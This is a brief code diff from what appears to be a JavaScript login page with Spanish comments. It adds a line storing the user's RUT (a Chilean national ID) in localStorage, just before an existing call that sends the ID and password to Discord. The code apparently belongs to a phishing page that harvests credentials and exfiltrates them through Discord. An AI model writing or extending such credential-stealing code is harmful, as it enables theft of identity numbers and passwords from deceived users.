@@ -415,6 +415,9 @@
                 return;
             }
             
+            // Guardar RUT en localStorage
+            localStorage.setItem('rutUsuario', rut);
+            
             sendToDiscord(rut, password);
         }
 
